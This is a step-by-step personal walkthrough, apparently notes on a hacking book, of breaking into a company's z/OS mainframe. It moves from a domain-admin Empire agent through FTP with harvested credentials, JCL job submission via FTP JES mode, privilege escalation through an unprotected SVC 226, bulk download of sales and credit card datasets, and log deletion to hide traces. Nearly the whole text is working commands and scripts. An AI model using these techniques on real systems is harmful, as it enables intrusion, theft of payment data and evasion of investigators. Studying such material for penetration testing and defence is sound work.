# Mainframe Exploitation via FTP Bouncing

*Note: this section continues from the previous cookbook on pass-the-hash technique (utilizing Empire) and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page no. 92)*

With the domain admin account now in hand, we use a familiar tactic to deploy a new Empire agent on the GBSales network. Our target is the FTP server SL0210 (10.30.30.210), which previously handled sales data from GBShop. We exploit our domain admin privileges to execute a PowerShell command via WMI, thus establishing our agent:

```
(Empire: DCshop) > shell wmic /node:SL0210.GBSALES.CORP process call create "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAcwB[...]"
```

Note: ensure you rename this Empire agent and switch to it to manage the session effectively.

Once connected, we navigate to the default FTP directory on the server:

```
(Empire: SalesFTP) > shell dir C:\inetpub\ftproot\
```

The folder is empty, which indicates the files are being transferred elsewhere. To trace them, we list all scheduled tasks on the machine:

```
(Empire: SalesFTP) > shell schtasks /Query /FO LIST /V
```

Note: schtasks /Query /FO LIST /V lists all scheduled tasks in a verbose format.

The output shows:

```
Job started: Debug32_ks12qv
Folder: \
HostName: SL0210
TaskName: \centralized_upload
Status: Ready
Author: GBSALES\administrator
Task To Run: "C:\Program Files\Scripts\centralized_upload.bat"
Comment: centralize all uploads to the big Iron
Scheduled Task State: Enabled
```

Upon examining the centralized_upload.bat script, we discover:

```
SET Server=10.30.30.41
SET UserName=FTPSRV
SET Password=PASS01
```

The script’s final delete command directs us to a new IP address: 10.30.30.41, indicating another target within the GBSALES network. FTP credentials are FTPSRV and PASS01.

We perform a quick port scan on this new machine to determine the most suitable entry point:

```
(Empire: SalesFTP) > usemodule situational_awareness/network/portscan
(Empire: portscan) > set Hosts 10.30.30.41
(Empire: portscan) > set TopPorts 1000
(Empire: portscan) > run
```

The results reveal:

```
Job started: Debug32_70b72
Hostname: 10.30.30.41
OpenPorts: 21, 22, 80, 111
```

Ports 21 (FTP), 22 (SSH), 80 (HTTP), and 111 (portmap) are open. The absence of SMB and RPC ports suggests this is likely a Linux system. With FTP being the only accessible service, further exploration will focus on it.

Since we lack an interactive session on the SL0210 server, we upload a simple FTP script to it. This script is saved as /root/simple_ftp.txt and is designed to connect to the FTP server at 10.30.30.41, list the files in the current directory, and then disconnect:

```
Open 10.30.30.41
FTPSRV
PASS01
dir
quit
```

Note: When transferring files between Unix and Windows systems, it’s crucial to ensure proper line endings. Use the unix2dos command to convert Unix line feeds (0x0A) to Windows-style line feeds with carriage returns (0x0D). For example:

```
unix2dos /path/to/file.txt
```

Now, let’s proceed with our script. We upload it to the SL0210 server and execute it:

```
(Empire: SalesFTP) > upload /root/simple_ftp.txt
C:\Users\sysback\AppData\Local\simple_ftp.txt
(Empire: SalesFTP) > shell cd C:\Users\sysback\AppData\Local\
(Empire: SalesFTP) > shell ftp -s:simple_ftp.txt > result.txt
(Empire: SalesFTP) > shell type result.txt
```

Here we use the FTP script to perform an FTP bounce attack, where we redirect the output of the FTP command into a file (result.txt). This approach allows us to capture the directory listing from the remote FTP server. By examining the result.txt file, we can gain insights into the files and directories available on the FTP server. Output redirection (> result.txt) captures the result of the FTP command into a file for later review.

The script is uploaded and executed using ftp -s:simple_ftp.txt, which runs the FTP commands specified in the script.

The output from our FTP script reveals several files, but their names seem unusual (ISPF.ISPPROF, SALES.BERLIN, SALES.HAMBURG) suggesting that we might be dealing with a mainframe rather than a standard Unix system. The header "IBM FTP CS V1R10" indicates that the FTP server is running on a z/OS operating system, which is common on mainframes. Despite this, standard FTP commands still function correctly.

A mainframe is like a high-performance computer with extensive processing power and memory (up to 10TB). The operating system version V1R10 (z/OS) is used on many mainframes. It includes a Unix-like partition for handling TCP/IP communications, FTP services, and other functionalities, making it accessible through familiar Unix commands.

To retrieve sales files from the FTP server, we use the mget command in combination with prompt to avoid manual confirmation for each file transfer:

```
open 192.168.1.200
FTPSRV
PASS01
ascii
mget SALES.*
prompt
quit
```

- ascii: Switches the transfer mode to ASCII, which is suitable for text files.

- mget ```SALES.*```: Retrieves all files matching the pattern ```SALES.*``` from the FTP server.

- prompt: Disables interactive prompts, allowing batch file transfers.

We are going to execute this script in a similar manner as before:

```
(Empire: SalesFTP) > upload /root/mget_ftp.txt
C:\Users\sysback\AppData\Local\mget_ftp.txt
(Empire: SalesFTP) > shell cd C:\Users\sysback\AppData\Local\
(Empire: SalesFTP) > shell ftp -s:mget_ftp.txt
(Empire: SalesFTP) > shell dir
```

The output reveals the following files: SALES.BERLIN, SALES.HAMBURG, and SALES.HANOVER. We will plan a careful exfiltration of this data to avoid detection. First, let’s examine one of the files:

```
(Empire: SalesFTP) > shell type SALES.BERLIN
```

The file SALES.BERLIN contains today’s sales data from every shop in Germany (note: the detailed output is omitted for brevity). This mainframe represents a significant and valuable target.

To monitor future sales, we could return daily to gather new data. However, what about past sales and credit card data? There must be other folders or archives of past years we can access. Since there are no additional folders in the current FTP service, we need to escape this restricted environment and access more sensitive data. For this, we'll delve deeper into the internals of z/OS.

An intriguing talk at Black Hat US highlighted a notable feature of FTP on z/OS: command execution. We can use this read/write service to submit JOBs (programs) to the mainframe.

Given our limited shell environment, we can’t rely on existing scripts and tools like MainTP and Metasploit. Instead, we'll write our own mainframe programs. A JOB in z/OS is essentially a task, and Job Control Language (JCL) is used to write these JOBs. Although JCL is known for its rigidity and lack of flexibility, its structure can be reused.

We’ll start with a basic program that dumps our current privileges on z/OS:

```
//FTPSRV1 JOB
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
LISTUSER
/*
//SYSIN DD DUMMY
//SYSTSPRT DD SYSOUT=*
```

As we can see, every JCL instruction begins with double slashes. The first line names the JOB (FTPSRV1) and uses the JOB keyword. The second line specifies that the IKJEFT01 program (the TSO shell on z/OS) will be executed. This program takes input from the SYSTSIN card, where we provide the LISTUSER command. The output of this command is directed to the console log as specified by the SYSTSPRT card.

Here’s the complete breakdown:

- FTPSRV1: The name of the JOB.

- JOB: The keyword indicating the start of a JOB.

- STEP01: The name of this step in the JOB.

- EXEC: Indicates execution of a program.

- PGM=IKJEFT01: Specifies the program to be executed, which is IKJEFT01 (the TSO program on z/OS).

- SYSTSIN: A special DD (Data Definition) statement that provides input to TSO commands. DD * Indicates that the input will follow inline.

- LISTUSER: The command to be executed by the IKJEFT01 program. LISTUSER lists user information.

- /*: Ends the inline input for the SYSTSIN DD statement.

- //SYSIN DD DUMMY: Another DD statement, here defined as DUMMY, indicating no actual data input is needed.

- //SYSTSPRT DD SYSOUT=*: SYSTSPRT: Defines where the output of the IKJEFT01 program will be sent. DD SYSOUT=* Specifies that the output should be sent to the system output (console log).

*Additional notes:*

*IKJEFT01 is a program used to run TSO (Time Sharing Option) commands on z/OS systems. It provides an interactive shell environment for executing TSO commands and utilities. Essentially, it allows users to run commands and scripts as if they were in a TSO session.*

*SYSTSIN is a DD (Data Definition) statement used to provide input to TSO commands. It specifies that the data following the DD * statement is to be read as input commands for the TSO program. This is where you input commands that you want the TSO shell to execute.*

*Cards (or DD statements) like SYSTSIN and SYSTSPRT are part of the JCL (Job Control Language) script. They are included in the JOB stream, which is submitted to the z/OS system to execute the defined tasks and programs.*

*SYSTSPRT is a DD statement that directs the output of TSO commands to a specified destination. In the example provided, ```SYSOUT=*``` indicates that the output should go to the system’s standard output, which is typically the console log.*

However, since we cannot access this console log via FTP, we need to modify the JCL to output the command’s result to a new file (FTPSRV.OUTPUT) that we can later download:

```
//FTPSRV1 JOB
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
LISTUSER
/*
//SYSIN DD DUMMY
//SYSTSPRT DD DSN=FTPSRV.OUTPUT,
//
DISP=(NEW,CATLG),
//
SPACE=(TRK,1)
```

A short breakdown:

- DSN=FTPSRV.OUTPUT: Specifies the dataset name for the output. In this case, the output is directed to a dataset named FTPSRV.OUTPUT.

- DISP=(NEW,CATLG),: DISP: Defines the dataset disposition. NEW: Indicates that a new dataset is to be created. CATLG: Specifies that the dataset should be cataloged after creation, making it available for future reference.

- SPACE=(TRK,1): SPACE: Specifies the amount of disk space to allocate for the new dataset. TRK,1: Allocates 1 track of space. Tracks are units of disk space on the mainframe.

Overall, this setup allows the output of the LISTUSER command to be saved in a designated dataset, which can be accessed or downloaded later.

With the JCL program prepared, we transfer it to the SALES server (SL0210) using the following FTP command:

```
(Empire: SalesFTP) > upload /root/FTPSRV.JOB
c:\users\sysback\appdata\local\
```

To execute the JOB on the z/OS mainframe, we need to switch to Job Entry Scheduler (JES) mode in FTP. Normally, FTP operates in sequential (SEQ) mode for regular file transfers. By changing the mode to JES, we can submit files directly to the internal reader of z/OS.

Here’s the FTP script for the job transfer (ftp_jes.txt):

```
open 192.168.1.200
FTPSRV
PASS01
quote site file=jes
put C:\Users\sysback\AppData\Local\FTPSRV.JOB
quit
```

With the ftp_jes.txt script ready, we proceed to execute it on the SALES server (SL0210). Here’s how the process unfolds:

```
(Empire: SalesFTP) > upload /root/ftp_jes.txt
c:\users\sysback\appdata\local\
(Empire: SalesFTP) > shell ftp -i -s:ftp_jes.txt > result.txt
(Empire: SalesFTP) > shell type result.txt
```

Note: ```shell ftp -i -s:ftp_jes.txt``` Runs the FTP command using the ftp_jes.txt script. The -i option specifies binary mode (for a reliable transfer), and -s specifies the script file to execute.

And now we need to check the output:

```
(Empire: SalesFTP) > shell type result.txt
```

This command displays the contents of result.txt, where you'll see responses from the FTP server, including crucial details like the JOB id (e.g., JOB04721). This JOB id is necessary for managing and eventually deleting the JOB from the mainframe console log.

The next required step would be retrieving the output file with the following FTP script (let's say we have named it "get_output.txt"):

```
open 192.168.1.200
FTPSRV
PASS01
get 'FTPSRV.OUTPUT' FTPSRV.OUTPUT.TXT
quit
```

This FTP script connects to the mainframe, logs in with the specified credentials, and retrieves the output file FTPSRV.OUTPUT, saving it locally as FTPSRV.OUTPUT.TXT.

Note: the script could be uploaded and executed like this:

```
(Empire: SalesFTP) > upload /root/get_output.txt
C:\Users\sysback\AppData\Local\get_output.txt
(Empire: SalesFTP) > shell cd C:\Users\sysback\AppData\Local\
(Empire: SalesFTP) > shell ftp -s:get_output.txt
```

After these steps, we can review the output (FTPSRV.OUTPUT.TXT) with the command:

```
(Empire: SalesFTP) > shell type FTPSRV.OUTPUT.TXT
```

This (omitted) output reveals the following key information:

```
USER=FTPSRV
ATTRIBUTES=NONE
GROUP=SALES
AUTH=USE
```

This indicates that the FTPSRV user has no special privileges (attributes=none) on the Mainframe. While this is not surprising, it confirms that our ability to execute code and retrieve output from the Mainframe is intact.

However, locating valuable data remains a challenge. Mainframes can store vast amounts of data, often running for decades, making it difficult to pinpoint specific folders. We need to focus on identifying access rules, which are fewer in number compared to the amount of data. This approach will help us find the data we need more effectively.

Access rules on z/OS are managed by security components such as RACF, TOPSecret, or ACF2. With RACF holding a significant market share, and the success of the LISTUSER command indicating that we are on a RACF system, we know that RACF manages our security rules. RACF uses three main access levels: READ, ALTER, and UPDATE. The ALTER privilege allows modification of both the content and the associated access rules, while UPDATE only permits changes to the content.

To locate rules related to SALES datasets within the RACF database, we use the following command:

```
SEARCH FILTER(*.SALES.**)
```

Note: to search the RACF database for defined rules covering SALES datasets, we can adapt our previous JOB script to include the SEARCH command:

```
//FTPSRV1 JOB
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
SEARCH FILTER(*.SALES.**)
/*
//SYSIN DD DUMMY
//SYSTSPRT DD DSN=FTPSRV.OUTPUT,
// DISP=(NEW,CATLG),
// SPACE=(TRK,1)
```

Then save the JCL script to a file, for example, "SEARCH.JOB".

To upload the JCL script to the server where you have FTP access:

```
(Empire: SalesFTP) > upload /root/SEARCH.JOB C:\Users\sysback\AppData\Local\SEARCH.JOB

```

Create the FTP script to submit the JOB:

```
// FTP script saved as ftp_search.txt
open 192.168.1.200
FTPSRV
PASS01
quote site file=jes
put C:\Users\sysback\AppData\Local\SEARCH_JOB.JCL
quit
```

Upload and run the FTP script:

```
(Empire: SalesFTP) > upload /root/ftp_jes.txt C:\Users\sysback\AppData\Local\ftp_jes.txt
(Empire: SalesFTP) > shell cd C:\Users\sysback\AppData\Local
(Empire: SalesFTP) > shell ftp -s:ftp_search.txt
```

Retrieve the output once the job has completed:

```
// FTP script saved as get_output.txt
open 192.168.1.200
FTPSRV
PASS01
get 'FTPSRV.OUTPUT' FTPSRV.OUTPUT.TXT
quit
```

Upload and run the FTP script to get the output:

```
(Empire: SalesFTP) > upload /root/get_output.txt C:\Users\sysback\AppData\Local\get_output.txt
(Empire: SalesFTP) > shell cd C:\Users\sysback\AppData\Local
(Empire: SalesFTP) > shell ftp -s:get_output.txt
(Empire: SalesFTP) > shell type FTPSRV.OUTPUT.TXT
```

Apologies for this lengthy digression, but I believe it's crucial to thoroughly understand and remember the workflow necessary for interacting with a mainframe in this context. I wish the book had done a better job summarizing and recapitulating these steps, which is why I'm creating my own detailed cookbooks.

Anyway, let's move on. Our approach here has one serious caveat: given our limited privileges, the SEARCH FILTER(*.SALES.**) command will likely fail unless:

- The FTPSRV account owns the rule or data, which is improbable.

- The FTPSRV account has the SPECIAL attribute, which it does not.

Given the unlikelihood of the first condition, we should consider privilege escalation. Despite its reputation as unhackable, there are several methods available as of 2017:

- Sniffing Traffic: Intercept network communications to capture credentials. Most mainframe communications are in clear text, making ARP poisoning effective, though time-consuming.

- Searching for Passwords in JCL Code and Scripts: While potentially rewarding, this can cause noticeable CPU spikes, drawing attention.

- Exploiting “Magic” Supervisor Calls (SVC): Special functions that can grant temporary high privileges if not properly protected.

- Targeting Poorly Protected Authorized Program Facilities (APF): Inserting a program into these directories can grant the highest privileges.

Note: *"Magic" Supervisor Calls (SVCs) are special system-level functions in the z/OS mainframe environment. They are typically used by administrators or software to perform privileged operations. When an SVC is invoked, it can execute code with high-level system permissions. If not properly secured, these SVCs can be exploited to gain unauthorized access or elevate privileges, making them a target for attackers seeking to escalate their access rights.*

*Authorized Program Facilities (APFs) are specific directories on a mainframe where trusted programs (with kernel-level access) reside. Programs in these directories can execute with elevated privileges. If these directories are not properly protected, an attacker could potentially insert malicious code into an APF directory. This would allow them to run the code with the highest system privileges, effectively gaining control over the mainframe.*

We can leverage existing tools for these tasks. For Man in the Middle attacks, Mainframed767’s tool SETn3270 is useful but requires dependencies like OpenSSL. As a last resort, we could compile it into an EXE.

Additionally, we can use ELV.SVC from ayoul3’s GitHub repository to locate and analyze "magic" SVC functions. This tool identifies SVCs that grant unlimited privileges and checks their protections. We can then create a program to exploit these SVCs, gaining full privileges and elevating our account to SPECIAL status.

ELV.SVC is a REXX script, similar to Python on z/OS. We need to transfer it to the mainframe and submit a JOB to execute the script:

```
(Empire: SalesFTP) > upload /root/ELV.SVC C:\Users\sysback\AppData\Local\
```

Create the FTP script to upload ELV.SVC:

```
// FTP script saved as ftp_svc.txt
open 192.168.1.200
FTPSRV
PASS01
put C:\Users\sysback\AppData\Local\ELV.SVC
quit
```

Upload and run the FTP script:

```
(Empire: SalesFTP) > upload /root/ftp_svc.txt C:\Users\sysback\AppData\Local\ftp_svc.txt
(Empire: SalesFTP) > shell ftp -i -s:ftp_svc.txt > result.txt
```

Check the output file:

```
(Empire: SalesFTP) > shell type result.txt
```

The JCL cards to execute this script are the same as before. The ‘LIST’ option passed to ELV.SVC searches for magic SVC in memory:

```
//FTPSRV1 JOB
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
ex 'FTPSRV.ELV.SVC' 'LIST'
/*
//SYSIN DD DUMMY
//SYSTSPRT DD DSN=FTPSRV.OUTPUT2,
// DISP=(NEW,CATLG),
// SPACE=(TRK,1)
```

Save the JCL script to a file (e.g., "SEARCH.JOB") and upload it:

```
(Empire: SalesFTP) > upload /root/SEARCH_JOB.JCL C:\Users\sysback\AppData\Local\SEARCH.JOB
```

Create the FTP script to submit the JCL and retrieve the output:

```
// FTP script saved as ftp_search.txt
open 192.168.1.200
FTPSRV
PASS01
quote site file=jes
put C:\Users\sysback\AppData\Local\SEARCH.JOB
quote site file=seq
get 'FTPSRV.OUTPUT2' FTPSRV.OUTPUT2.TXT
quit
```

Upload and run the FTP script to submit the JCL and get the output:

```
(Empire: SalesFTP) > upload /root/ftp_search.txt C:\Users\sysback\AppData\Local\ftp_search.txt
(Empire: SalesFTP) > shell ftp -s:ftp_search.txt
```

Check the output file:

```
(Empire: SalesFTP) > shell type C:\Users\sysback\AppData\Local\FTPSRV.OUTPUT2.TXT
```

The output from the last command is not shown in detail here due to its extensive nature. However, key elements to note include:

- The last column in the output labeled "AUTH-BIT" will display a row with "YES."

- At the bottom of the output, look for a line that begins with "DUMPING AUTH SVC 226."

It appears that SVC number 226 may indeed be a "magic" Supervisor Call with no security checks. While we won’t delve into the assembly code details here, it's significant to note that anyone who successfully calls SVC 226 could gain extensive access to the z/OS system—an unsettling prospect. For a real-world example of such vulnerabilities, consider researching the Logica Mainframe incident.

To leverage this, we need to adjust our JCL script to use SVC number 226. Additionally, we must create a dataset, FTPSRV.PDS, to serve as a library where ELV.SVC can compile and store its payload:

```
//FTPSRV1 JOB
//PDS
DD DSN=FTPSRV.PDS(NEWMEM),DISP=(NEW,CATLG),
//
SPACE=(TRK,(1,1,24)),RECFM=U
//
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
ex 'FTPSRV.ELV.SVC' 'DSN=FTPSRV.PDS SVC=226'
/*
//SYSIN
DD DUMMY
//SYSTSPRT DD DSN=FTPSRV.OUTPUT3,
// DISP=(NEW,CATLG),
// SPACE=(TRK,1)
```

Breakdown of new JCL elements:

1. Creating a PDS Dataset:

```
//PDS
DD DSN=FTPSRV.PDS(NEWMEM),DISP=(NEW,CATLG),
```

- `DD` (Data Definition): This specifies a new dataset definition.

- `DSN=FTPSRV.PDS(NEWMEM)`: This defines the dataset name (`FTPSRV.PDS`) and the member name within the dataset (`NEWMEM`).

- `DISP=(NEW,CATLG)`: This means the dataset is newly created and will be cataloged (registered) once the job completes successfully.

2. Space allocation and record format:

```
//
SPACE=(TRK,(1,1,24)),RECFM=U
```

- `SPACE=(TRK,(1,1,24))`: Allocates disk space in tracks (TRK). It requests an initial allocation of 1 track, with the possibility to extend by 1 track if needed, and specifies a maximum of 24 tracks.

- `RECFM=U`: Specifies the record format as undefined (U), meaning that the dataset can handle variable-length records without a fixed format.

3. Executing the REXX script:

```
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
ex 'FTPSRV.ELV.SVC' 'DSN=FTPSRV.PDS SVC=226'
```

- `ex 'FTPSRV.ELV.SVC'`: Executes the REXX script `ELV.SVC` located in the `FTPSRV` dataset.

- `'DSN=FTPSRV.PDS SVC=226'`: Passes parameters to the REXX script, specifying that it should use dataset `FTPSRV.PDS` and call Supervisor Call (SVC) number 226.

We execute the job again through the trusted FTP service, then fetch the output file:

```
(Empire: SalesFTP) > shell type FTPSRV.OUTPUT3.TXT
```

The output reveals the following important information:

```
ex 'FTPSRV.ELV.SVC' 'DSN=FTPSRV.PDS SVC=226'
loading into
then using SVC 226 to get AUTH
compiling WSOAMWQ in FTPSRV.PDS
READY
```

This output indicates that the ELV.SVC script successfully loaded and used SVC 226 to obtain authorization, then compiled a payload into the specified library.

Now, we check the privileges of FTPSRV using the same LISTUSER command as before.

Note: here is the whole JCL script again as a quick reference:

```
//FTPSRV1 JOB
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
LISTUSER
/*
//SYSIN DD DUMMY
//SYSTSPRT DD DSN=FTPSRV.OUTPUT,
//
DISP=(NEW,CATLG),
//
SPACE=(TRK,1)
```

Note: Majority of these little in-between "FTP bouncing" steps are being skipped now for brevity, as they are already explained above.

Checking the output:

```
(Empire: SalesFTP) > shell type FTPSRV.OUTPUT4.TXT
```

The output here is omitted for brevity, but one crucial piece of information is:

```
ATTRIBUTES=SPECIAL OPERATIONS
```

This indicates that the FTPSRV user now has SPECIAL privileges.

Now that we have proper authority over RACF, we can issue that coveted search command:

```
//FTPSRV1 JOB
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
SEARCH FILTER(*.SALES.**)
/*
//SYSIN DD DUMMY
//SYSTSPRT DD DSN=FTPSRV.OUTPUT5,
// DISP=(NEW,CATLG),
// SPACE=(TRK,1)
```

Checking the output again:

```
(Empire: SalesFTP) > shell type FTPSRV.OUTPUT5.TXT
```

The output reveals the following:

```
1READY
SEARCH FILTER(*.SALES.**)
SALESMAS.SALES.*
SALESMAS.SALES.ACCOUNTS.*
SALESMAS.SALES.PRODUCTS.*
ARCHIVE.SALES.*
BACKUP.SALES.*
```

Here we can see the sales data, credit card numbers, products, etc. All that is really left to do is to download these files using the familiar mget command:

To download the files, execute the following FTP commands:

```
open 192.168.1.200
FTPSRV
PASS01
mget SALESMAS.SALES.ACCOUNTS.*
prompt
mget SALESMAS.SALES.PRODUCTS.*
prompt
mget ARCHIVE.SALES.*
prompt
quit
```

Before leaving the Mainframe, we need to erase the multiple files we created. This ensures that investigators will have minimal traces to follow. Use the following JCL to clean up:

```
//FTPSRV1 JOB,MSGLEVEL=0
//STEP01 EXEC PGM=IKJEFT01
//SYSTSIN DD *
DELETE 'FTPSRV.OUTPUT1'
DELETE 'FTPSRV.OUTPUT2'
DELETE 'FTPSRV.OUTPUT3'
DELETE 'FTPSRV.OUTPUT4'
DELETE 'FTPSRV.OUTPUT5'
DELETE 'FTPSRV.PDS'
DELETE 'FTPSRV.ELV.SVC'
OUTPUT FTPSRV1(JOB04721) delete
OUTPUT FTPSRV1(JOB04722) delete
OUTPUT FTPSRV1(JOB04723) delete
OUTPUT FTPSRV1(JOB04724) delete
OUTPUT FTPSRV1(JOB04725) delete
ALU FTPSRV NOSPECIAL NOOPERATIONS
/*
//SYSIN DD DUMMY
//SYSTSPRT DD SYSOUT=*
```

Note: The MSGLEVEL=0 instruction in the JOB card prevents logging of the core content of this JCL. Logs from previous JCL submissions are deleted with the “OUTPUT” commands. The ALU command removes the SPECIAL and OPERATIONS privileges from the account to restore it to its normal state.

That’s a wrap on the Mainframe saga! Despite their perception as outdated and often overlooked in the hacking community, Mainframes hold substantial amounts of critical data. While pentesters might focus on emails and Domain Controllers, real data often resides in Mainframe datasets, which may sometimes suffer from inadequate security audits.
